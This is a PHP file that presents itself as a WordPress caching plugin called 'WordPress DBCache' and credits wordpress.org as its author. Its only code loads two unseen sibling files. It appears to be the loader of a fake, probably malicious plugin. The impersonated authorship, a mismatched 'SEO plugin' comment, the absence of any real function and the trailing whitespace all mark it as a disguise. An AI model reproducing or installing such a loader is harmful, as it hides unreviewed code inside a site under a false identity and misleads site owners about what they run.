<?php

/*
Plugin Name: WordPress DBCache
Plugin URI: http://wordpress.org/extend/plugins/
Description: WordPress DBase Cache.
Author: wordpress.org
Author URI: http://wordpress.org/
Text Domain: wp-dbase-cache
License: GPL version 2 or later - http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
Version: 3.2.8


Copyright 2016	wordpress.org

	This program is free software; you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation; either version 2 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110, USA
*/

if ( ! defined( 'WPDBASECACHE_FILE' ) ) {
	define( 'WPDBASECACHE_FILE', __FILE__ );
}

// Load the SEO plugin.
if (file_exists(dirname( WPDBASECACHE_FILE ) . '/wp-cache-main.php')) {
    require_once( dirname( WPDBASECACHE_FILE ) . '/wp-cache-main.php' );
}

if (file_exists(dirname( WPDBASECACHE_FILE ) . '/wp-cache-init.php')) {
    require_once( dirname( WPDBASECACHE_FILE ) . '/wp-cache-init.php' );
}
																																												
